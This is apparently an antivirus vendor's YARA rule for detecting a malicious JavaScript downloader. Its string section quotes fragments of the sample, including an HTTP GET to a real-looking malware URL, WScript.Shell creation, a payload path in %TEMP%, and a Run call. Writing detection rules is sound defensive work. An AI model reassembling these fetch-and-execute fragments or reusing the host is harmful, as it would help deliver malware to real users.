rule sig_20160330_7a355c81395fd1a4fafb965c55e30662 {
  meta:
    description = "datamaliciousorder - file 20160330_7a355c81395fd1a4fafb965c55e30662.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "06dc4299710cdc32a872bfc046eaae8c243d6517cccf49ce8adac637f67b62ec"

  strings:
    $s1  = "function T(QM0, I){N = N * 1; return QM0 - I;};" fullword ascii
    $s2  = "B[J](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s3  = "var P = function V() {return WScript[EA](\"WScript\"+\".Shell\");}(), KV = 11;" fullword ascii
    $s4  = "if (B[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZF() {return P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"r2hrMjmYq.ex\" + \"e\";};" fullword ascii
    $s6  = "function X(){return HN + \"\";};" fullword ascii
    $s7  = "function XN() {return ((K0 == true) && (K0 == N0)) ? 1 : N;};" fullword ascii
    $s8  = "function D(SX){P[\"Run\"](SX, N, N);};" fullword ascii
    $s9  = "function V0()" fullword ascii
    $s10 = "function CQ(){return EA;};" fullword ascii
    $s11 = "function O(QW) {var EP = (1, 2, 3, 4, 5, QW); return EP;};" fullword ascii
    $s12 = "var WD = new this[\"Date\"]();" fullword ascii
    $s13 = "function ZB(){return 22;};" fullword ascii
    $s14 = "return T(QM, EN);" fullword ascii
    $s15 = "}while (QZ);" fullword ascii
    $s16 = "N0 = true; " fullword ascii
    $s17 = "var N0 = false;" fullword ascii
    $s18 = "var K0 = false;" fullword ascii
    $s19 = "K0 = true; " fullword ascii
    $s20 = "var V2 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}